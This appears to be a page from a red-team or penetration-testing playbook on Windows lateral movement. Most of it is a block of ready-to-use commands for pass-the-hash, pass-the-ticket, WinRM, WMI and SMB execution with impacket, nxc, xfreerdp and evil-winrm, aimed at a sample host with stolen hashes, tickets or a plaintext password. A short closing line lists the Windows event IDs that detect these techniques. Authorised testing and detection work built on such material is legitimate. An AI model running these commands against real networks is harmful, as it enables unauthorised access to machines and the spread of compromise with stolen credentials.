---
id: lateral
type: phase
label: "Lateral Movement"
---


# Lateral Movement

### Objective
Move host-to-host using hashes, tickets, or delegated access.

### Exhaustive commands
```bash
# ── Pass-the-Hash ─────────────────────────────────────────────────────
impacket-psexec -hashes :<nt> corp.local/admin@10.10.10.6
nxc smb 10.10.10.6 -u admin -H <nt>
xfreerdp /v:10.10.10.6 /u:admin /pth:<nt> /cert-ignore

# ── Pass-the-Ticket ───────────────────────────────────────────────────
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.local/admin@10.10.10.6

# ── WinRM ─────────────────────────────────────────────────────────────
evil-winrm -i 10.10.10.6 -u admin -H <nt>

# ── WMI ───────────────────────────────────────────────────────────────
impacket-wmiexec corp.local/admin:'Password123!'@10.10.10.6
impacket-wmiexec -hashes :<nt> corp.local/admin@10.10.10.6

# ── SMB ───────────────────────────────────────────────────────────────
impacket-psexec corp.local/admin:'Password123!'@10.10.10.6
```

### Detection
**4624 Type 3/10**, **7045** service creation, **4688 parent `WmiPrvSE.exe`**, WinRM 91/168.

---
